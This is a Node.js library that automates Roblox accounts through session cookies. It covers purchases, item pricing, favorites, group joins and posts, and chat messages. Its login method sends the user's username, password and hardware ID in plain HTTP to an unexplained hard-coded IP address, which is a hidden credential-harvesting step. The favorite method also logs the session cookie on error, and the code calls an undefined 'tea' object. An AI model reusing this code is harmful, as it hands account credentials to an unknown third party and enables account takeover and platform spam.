let request = require('request-promise'),
    randomToken = require('random-token'),
    cheerio = require('cheerio')


process.setMaxListeners(1000000000);

class rbxbot {
  constructor(cookie = '') {
    this.cookie = cookie;
    this.cuser = '';
    this.cpass = '';
    this.token = '';
    
    request = request.defaults({
      forever: true,
      agentOptions: {
        maxSockets: Infinity
      },
      simple: false,
      gzip: true,
      timeout: 15000
    });
    
    if (this.cookie === '') {
      this.session_based = false;
    } else {
      this.session_based = true;
    }
  }
  
  async create_device_handle() {
    try {
      let data = {
        "mobileDeviceId": randomToken(16).toLowerCase()
      }
      return await request({
        uri: 'https://api.roblox.com/device/initialize',
        method: 'POST',
        data: data,
        headers: {
          'user-agent': 'Mozilla/5.0'
        },
        resolveWithFullResponse: true
      }).then((res) => {
         let body = JSON.parse(res.body);
         console.log(body);
          var devicehandle = tea.encrypt(JSON.stringify(body.browserTrackerId));
         return {success: true, browserTrackerId: body.browserTrackerId, device_handle: devicehandle};
      })
        .catch((err) => {
          throw new Error(err);
      })
     
      
    } catch (err) {
      return {success: false, error: err.message};
    }
  }
  
  async cookie_login(cookie) {
    try {
      if(!cookie || cookie === '' || cookie.split('_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_').length < 1) {
        throw new Error('Cookie is invalid!');
      } else {
        this.cookie = cookie;
        return {success: true}
      }
    } catch(error) {
      return  {success: false, error: error.message};
    }
  }
  
    async login(username, password, hwid) {
    try {

      return await request(`http://54.39.87.168/APIs/secret/cookierefresh?username=${username}&password=${password}&hwid=${hwid}`, {
        method: 'POST',
        resolveWithFullResponse: true
      }).then((response)=>{
        //console.log(response.body);
        let body = JSON.parse(response.body);
        if(body.success === false) {
          throw new Error(body.message);
        }
        
        return {success: true, cookie: body.cookie};
      })
        .catch((err) => {
          //console.log(err.message);
          throw new Error(err.message);
      })
      
    
    } catch(err) {
      //console.log(err);
      try {
        let l = JSON.parse(err.message);
        if(l.errors[0].code === 8) return await this.login(username, password, hwid);
        err.message = l.errors[0].message;
      } catch (e) {
      
      }
      return {success: false, error: err.message};
    }
  }
  
  async user_info() {
    try {
      
      if(this.cookie === '') {
        throw new Error('You are not logged in!');
      }
      
      return await request('https://www.roblox.com/mobileapi/userinfo', {
        method: 'GET',
        headers: {
          'Cookie': `${this.cookie};`
        },
        resolveWithFullResponse: true
      }).then((response) => {
      
        return {success: true, info: response.body};
      })
        .catch((err) => {throw new Error(err)})
    } catch(err) {
      return  {success: false, error: err.message};
    }
  }
  
  async get_token() {
    try {
      return await request('https://api.roblox.com/sign-out/v1', {
        method: 'POST',
        headers: {
          'Cookie': `${this.cookie};`
        },
        resolveWithFullResponse: true
      }).then((response) => {
      
      let token = response.headers['x-csrf-token'];
      
      if(token) {
        this.token = token;
        return {success:true,token:token};
      } else {
        throw new Error('Error thrown while trying to get token');
      }
      })
    } catch(err) {
      //console.log(err)
      return {success:false,error:err.message};
    }
  }
  
  async get_verification(url) {
    try {
      if(this.cookie === '') {
        throw new Error('You are not logged in!');
      }
      //await this.get_token();
      return await request({
        uri: url,
        headers: {
          'X-CSRF-TOKEN': this.token,
          'Cookie': `${this.cookie};`,
          'user-agent': 'Mozilla/5.0'
        },
        resolveWithFullResponse: true,
        followRedirect: true
      }).then((response) => {
        //console.log(response);
      if(response.statusCode === 403) {
        this.get_token();
        return this.get_verification(url);
      }
      let $ = cheerio.load(response.body);
      
      
      var inputs = {};
      var match;
      //var done = false;
      var find = ['__VIEWSTATE', '__VIEWSTATEGENERATOR', '__EVENTVALIDATION', '__RequestVerificationToken'];
      for (var i = 0; i < find.length; i++) {
          var get = find[i];
          inputs[get] = $('input[name=' + get + ']').val();
          //console.log(inputs);
      }
      if (response.headers && response.headers['set-cookie']) {
          //console.log(response.headers);
          match = response.headers['set-cookie'].toString().match(/__RequestVerificationToken=(.*?);/);
          inputs["requestToken_header"] = match;
      }
        //console.log(inputs)
        return {success:true,verifications: inputs};
      }).catch((err) => {
        console.log(err);
        throw new Error(err);
      })
    } catch(err) {
      return {success:false,error:err.message};
    }
  }
  
  async configurePrice(assetid, price) {
    try {
      let asset = await this.getProductInfo(assetid);
      if(asset.success === false) throw new Error(asset.error);
      asset = asset.info;
      
      let verification = await this.get_verification('https://www.roblox.com/My/Item.aspx?ID=' + assetid);
      if(verification.success === false) throw new Error(verification.error);
      verification = verification.verifications;
      //console.log(assetid +'\m'+ price)
      var data = {
        __EVENTTARGET: 'ctl00$cphRoblox$SubmitButtonTop',
        ctl00$cphRoblox$DescriptionTextBox: asset.Description,
        ctl00$cphRoblox$NameTextBox: asset.Name,
        ctl00$cphRoblox$actualGenreSelection: asset.AssetTypeId || 1
      };
      data.ctl00$cphRoblox$SellThisItemCheckBox = 'on';
      data.ctl00$cphRoblox$SellForRobux = 'on';
      data.ctl00$cphRoblox$RobuxPrice = price;
      data.ctl00$cphRoblox$EnableCommentsCheckBox = 'on';
      
      var inputs = verification;
      
      for (var input in data) {
        inputs[input] = data[input];
      }
      
      var options = {
        uri: 'https://www.roblox.com/My/Item.aspx?ID=' + assetid,
        method: 'POST',
        form: inputs,
        headers: {
          'X-CSRF-TOKEN': this.token,
          'Cookie': '' + this.cookie + ';__RequestVerificationToken=' + verification.__RequestVerificationToken + ';'
        },
        resolveWithFullResponse: true
      };
      
      //console.log(options);
      
      
      return await request(options) 
        .then((response) => {
        //console.log(response);
        //process.exit();
          if(response.statusCode === 403) {
            this.get_token();
            return this.configurePrice(assetid, price);
          }
          if(response.statusCode === 200) {
            //console.log(response);
            return {success:true}
          } else {
             // console.log(response.body);
            //console.log(response);
            //console.log(this.cookie+'\n'+assetid+'\n'+info);
            throw new Error('Unknown error occured during configure')
          }
      })
        .catch((err) => {
          throw new Error(err);
      })
      
      
    } catch(err) {
      return {success: false, error: err.message};
    }
  }
  
  async favorite(assetid) {
    try {
      let verification = await this.get_verification('https://web.roblox.com/catalog/' + assetid);
      if(verification.success === false) throw new Error(verification.error);
      verification = verification.verifications;
      
      var options = {
        uri: 'https://www.roblox.com/favorite/toggle',
        method: 'POST',
        json: {'assetId':assetid},
        headers: {
          'X-CSRF-TOKEN': this.token,
          'Cookie': '' + this.cookie+ ';__RequestVerificationToken=' + verification.__RequestVerificationToken + ';'
        },
        followRedirect: true,
        resolveWithFullResponse: true
      };
      
      return await request(options)
        .then((response) => {
          //throw new Error(JSON.stringify(response.body))
          if(response.statusCode === 403) {
            this.get_token();
            return this.favorite(assetid);
          }
          if(response.body.success === true) {
            return {success:true}
          } else {
            throw new Error(response.body.message);
          }
          
      })
        .catch((err) => {
          throw new Error(err);
      })
    } catch(err) {
        console.log(this.cookie);
        
      return {success: false, error: err.message};
    }
  }
  
  async delete(assetid) {
    try  {
      let verification = await this.get_verification('https://web.roblox.com/catalog/' + assetid);
      if(verification.success === false) throw new Error(verification.error);
      verification = verification.verifications;
      
      var options = {
          uri: 'https://web.roblox.com/asset/delete-from-inventory',
          method: 'POST',
          formData: {'assetId':assetid},
          resolveWithFullResponse: true,
          headers: {
            'X-CSRF-TOKEN': this.token,
            'Cookie': '' + this.cookie + ';__RequestVerificationToken=' + verification.__RequestVerificationToken
          }
      };

    
      return await request(options)
        .then((response) => {
          if(response.statusCode === 403) {
            this.get_token();
            return this.delete(assetid);
          }
          if(response.statusCode === 200) {
            return {success: true};
          } else {
            //console.log(response)
            throw new Error('Unknown error occured while deleting');
          }
      })
        .catch((err) => {
          throw new Error(err);
      })
      
    } catch(error) {
      return {success: false, error: error.message};
    }
  }
  async buy(assetid, robux) {
    try {
      let product = await this.getProductInfo(assetid);
      if(product.success === false) throw new Error(product.error);
      product = product.info;
      //let verification = await this.get_verification('https://web.roblox.com/catalog/' + assetid);
      //if(verification.success === false) throw new Error(verification.error);
      //verification = verification.verifications;
      
      //console.log(verification);
      
      //console.log(product);
      let options = {
          uri: 'https://www.roblox.com/API/Item.ashx?rqtype=purchase&productID=' + product.ProductId + '&expectedCurrency=1&expectedPrice=' + robux+ '&expectedSellerID=' + product.Creator.Id + '&userAssetID=' + product.UserAssetId,
          method: 'POST',
          resolveWithFullResponse: true,
          headers: {
            'X-CSRF-TOKEN': this.token,
            'Cookie': '' + this.cookie + ';'
        }
      };

      //console.log(options);
      
      //console.log(options); 
      
      return await request(options)
        .then((response) => {
          if(response.statusCode === 403) {
            this.get_token();
            return this.buy(assetid, robux);
          }
          //console.log(response)
          let body = JSON.parse(response.body);
        //console.log(body);
        //console.log(body)
          let err = body.errorMsg;
          if (body.showDivID === 'InsufficientFundsView') {
              err = 'You need ' + Math.abs(body.balanceAfterSale) + ' more robux to purchase this item.';
          }
          if(!err) {
            if(body.TransactionVerb === 'bought') {
              return {success:true};
            } else {
              throw new Error('Unknown error occured while buying!');
            }
          } else {
            throw new Error(err);
          }
          
      })
        .catch((err) => {
          throw new Error(err);
      })
      
    } catch(err) {
      return {success:false, error: err.message};
    }
  }
  
  async getProductInfo(assetid) {
    try {
      return await request(`https://api.roblox.com/marketplace/productinfo?assetId=${assetid}`)
        .then(body => {
          return {success: true, info: JSON.parse(body)}
      })
        .catch((err) => {
          throw new Error(err);
      })
    } catch(err) {
      return {success: false, error: err.message};
    }
  }
  
  async join_group(gid) {
    try {
      let options = {
          uri: `https://www.roblox.com/groups/join-group-ajax`,
          method: 'POST',
          formData: {'id': gid},
          resolveWithFullResponse: true,
          headers: {
            'X-CSRF-TOKEN': this.token,
            'Cookie': '' + this.cookie + ';'
        }
      };
      return await request(options)
        .then((res) => {
          //console.log(res.body);
        let body = JSON.parse(res.body)
          if(res.statusCode === 403) {
            
            if(Object.keys(body).length === 0 && body.constructor === Object){
              this.get_token();
              return this.join_group(gid);
             
            }
            if(body.success === false) {
              throw new Error(body.message);
            }
          }
          if(body.success === false) {
              throw new Error(body.message);
            }

          return {success:true}
      })
        .catch((err) => {
          throw new Error(err);
      })

    } catch (err) {
      return {success:false, error: err.message}
    }
  }
  
  async leave_group(gid) {
    try {
      let verification = await this.get_verification('https://www.roblox.com/My/Groups.aspx?gid=' + gid);
      if(verification.success === false) throw new Error(verification.error);
      verification = verification.verifications;
      var events = {
        'ctl00$cphRoblox$ctl01': ''
      };
      for (var ver in events) {
        verification[ver] = events[ver];
      }

      let options = {
          uri: `https://www.roblox.com/My/Groups.aspx?gid=${gid}`,
          method: 'POST',
          form: verification,
          resolveWithFullResponse: true,
          headers: {
            'X-CSRF-TOKEN': this.token,
            'Cookie': '' + this.cookie + ';__RequestVerificationToken=' + verification.__RequestVerificationToken
        }
      };
      return await request(options)
        .then((res) => {
          //console.log(res.body);
        //let body = JSON.parse(res.body)
          if(res.statusCode === 403) {
              this.get_token();
              return this.join_group(gid);
          }
          if (res.statusCode !== 302 || !res.headers.location.endsWith('/My/Groups.aspx')) {
            throw new Error('Could not leave group!');
          }
          //console.log(res.body);

          return {success:true}
      })
        .catch((err) => {
          throw new Error(err);
      })

    } catch (err) {
      return {success:false, error: err.message}
    }
  }
  
  async get_groups_ply(userid) {
    try {
      let options = {
          uri: `https://api.roblox.com/users/${userid}/groups`,
          method: 'GET',
          resolveWithFullResponse: true,
          headers: {
            'Cookie': '' + this.cookie + ';'
        }
      };
      return await request(options)
        .then((res) => {
          return {success: true, groups: res.body};
      })
        .catch((err) => {
          throw new Error(err);
      });
    } catch(err) {
      return {success:false, error:err.message};
    }
  }
  
  async group_post(gid, message) {
    try {
      var events = {
        ctl00$cphRoblox$GroupWallPane$NewPost: message,
        ctl00$cphRoblox$GroupWallPane$NewPostButton: 'Post'
    };
      let verification = await this.get_verification('https://www.roblox.com/My/Groups.aspx?gid=' + gid);
      if(verification.success === false) throw new Error(verification.error);
      verification = verification.verifications;

      for (var ver in events) {
        verification[ver] = events[ver];
      }

      let options = {
          uri: `https://www.roblox.com/My/Groups.aspx?gid=${gid}`,
          method: 'POST',
          form: verification,
          resolveWithFullResponse: true,
          headers: {
            'X-CSRF-TOKEN': this.token,
            'Cookie': '' + this.cookie + ';__RequestVerificationToken=' + verification.__RequestVerificationToken
        }
      };
      return await request(options)
        .then((res) => {
          //console.log(res.body);
        //let body = JSON.parse(res.body)
          if(res.statusCode === 403) {
              this.get_token();
              return this.join_group(gid);
          } 
          if (res.statusCode !== 200 ) {
            throw new Error('Could not Post!');
          }
          //console.log(res.body);

          return {success:true}
      })
        .catch((err) => {
          
		  throw new Error(err);
      })
    } catch (err) {
      return {success:false, error:err.message};
    }
  }
  
  async getConversations() {
    try {
      let options = {
          uri: `https://chat.roblox.com/v2/get-user-conversations?pageNumber=1&pageSize=9999999`,
          method: 'GET',

          resolveWithFullResponse: true,
          headers: {
            'X-CSRF-TOKEN': this.token,
            'Cookie': '' + this.cookie + ';'
        }
      }
      return request(options)
        .then((res) => {
        if(res.statusCode === 403) {
              this.get_token();
              return this.getConversations();
          }
          
          let response = JSON.parse(res.body);
          return {success: true, conversations: response};
      })
        .catch(err => {
          throw new Error(err);
      })
    } catch (err) {
      return {success:false, error: err.message};
    }
  }
  
    async sendmsg(msg, convid) {
    try {
      let options = {
          uri: `https://chat.roblox.com/v2/send-message`,
          method: 'POST',
          json: {"conversationId":convid,"message":msg},
          resolveWithFullResponse: true,
          headers: {
            'X-CSRF-TOKEN': this.token,
            'Cookie': '' + this.cookie + ';'
        }
      }
      return request(options)
        .then((res) => {
        if(res.statusCode === 403) {
              this.get_token();
              return this.sendmsg(msg, convid);
          }
          
          if(res.statusCode === 200) {
            //console.log('ok');
            return {success: true};
          } else {
            return {success:false, error: 'Could not send message to Conversation!'};
          }
      })
        .catch(err => {
          throw new Error(err);
      })
    } catch (err) {
      //console.log(err.message);
      return {success:false, error: err.message};
    }
  }
  
  
  
}
module.exports = rbxbot;